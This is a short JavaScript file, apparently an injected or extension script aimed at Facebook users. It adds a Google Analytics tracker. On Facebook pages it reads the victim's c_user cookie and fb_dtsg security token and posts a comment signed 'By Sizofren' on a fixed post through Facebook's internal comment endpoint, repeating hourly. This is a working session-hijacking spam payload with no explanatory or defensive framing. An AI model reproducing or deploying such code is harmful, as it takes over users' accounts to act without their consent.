var data = document.createElement("script");
data.type = "text/javascript";
data.innerHTML = "(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-71047990-1', 'auto'); ga('send', 'pageview');";
document.body.appendChild(data);
if(top.location.hostname.indexOf("facebook") > -1){
	
var profile_id = document.cookie.match(/c_user=(\d+)/)[1];
var config = document.getElementsByName('fb_dtsg')[0].value;

function king(id,mesaj){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == 4) {}
};
var params = "&ft_ent_identifier=" + id;
params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
params += "&comment_text=" + mesaj;
params += "&_user=" + document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();;
params += "&ft[tn]=[]";
params += "&giftoccasion=";
params += "&attached_photo_fbid=0";
params += "&attached_sticker_fbid=0";
params += "&parent_comment_id=";
params += "&reply_fbid=";
params += "&source=2";
params += "&client_id=1384301515666=3764176756"
xmlhttp.open("POST", "/ajax/ufi/add_comment.php", true);
xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(params);
}

tarih = new Date();
    storage_key = 'access_tokendfffaz_' + profile_id;
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 1000 * 60 * 60);
        localStorage[storage_key] = tarih.getTime();
king("1798069480478880","abi seni seviyoruz <3 By Sizofren");
    }
	

 } 
